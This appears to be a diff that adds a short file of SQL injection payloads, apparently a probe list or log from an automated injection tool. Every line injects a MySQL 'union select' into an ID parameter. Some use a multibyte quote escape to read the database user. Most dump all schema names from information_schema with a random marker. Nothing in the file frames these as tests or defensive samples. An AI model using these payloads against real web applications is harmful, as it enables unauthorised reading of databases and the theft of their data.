@@ -1,0 +1,8 @@
+ID:-1ß\' union select 1,user(),2-- 
+ID:-1ß\' union select 1,user(),2-- 
+ID:-1 union select 1,2,concat(\'schemas:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'OwtxG8XcJK:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'V57x7exVxn:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'oJh6jvKXql:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'ByXJdM9exT:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'1uCCZiouR7:\',group_concat(schema_name)) from information_schema.schemata -- 
